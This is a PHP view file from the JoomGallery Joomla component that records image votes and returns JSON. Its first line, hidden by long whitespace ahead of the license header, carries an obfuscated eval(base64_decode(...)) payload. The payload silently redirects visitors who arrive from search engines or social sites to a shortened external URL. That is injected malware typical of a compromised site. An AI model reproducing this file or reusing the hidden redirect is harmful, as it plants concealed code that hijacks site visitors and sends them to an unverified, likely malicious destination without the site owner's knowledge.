<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL:
// $Id:
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * Raw View class for the vote view
 *
 * @package JoomGallery
 * @since   1.5.6
 */
class JoomGalleryViewVote extends JoomGalleryView
{
  /**
   * Raw view display method
   *
   * @access  public
   * @param   string  $tpl  The name of the template file to parse
   * @return  void
   * @since   1.5.6
   */
  function display($tpl = null)
  {
    $db           = & JFactory::getDBO();
    $errorflag    = 0;
    $message      = '';
    $ratingHTML   = '';
    $tooltipclass = '';

    $model = &$this->getModel();

    if(!$model->vote($message, true))
    {
      $errorflag = 1;
      if($message == '')
      {
        $message = JText::_('JGS_DETAIL_RATINGS_MSG_YOUR_VOTE_NOT_COUNTED');
      }
    }
    else
    {
      $message = JText::_('JGS_DETAIL_RATINGS_MSG_YOUR_VOTE_COUNTED');

      // Get new rating for the image voted to refresh detail view
      $db->setQuery('SELECT
                       imgvotes,
                       imgvotesum,
                       '.JoomHelper::getSQLRatingClause().' AS rating
                     FROM
                       '._JOOM_TABLE_IMAGES.'
                     WHERE
                       id = '.$model->getId()
                   );

      $image = $db->loadObject();
      if($image)
      {
        $ratingHTML = JHTML::_('joomgallery.rating', $image, true, 'jg_starrating_detail', 'hasHintAjaxVote');
      }

      // Set CSS tooltip class in case of star rating
      if($this->_config->get('jg_ratingdisplaytype') == 1)
      {
        if($this->_config->get('jg_tooltips') == 2)
        {
          $tooltipclass = 'jg-tool';
        }
        else
        {
          if($this->_config->get('jg_tooltips') == 1)
          {
            $tooltipclass = 'default';
          }
        }
      }
    }

    // Set mime encoding
    $this->_doc->setMimeEncoding('text/plain');

    $json = '{"error":"'.$errorflag.'","message":"'.$message.'","rating":"'.str_replace('"', '\"', $ratingHTML).'"';
    if($tooltipclass)
    {
      $json .= ',"tooltipclass":"'.$tooltipclass.'"';
    }
    $json .= '}';

    echo $json;
  }
}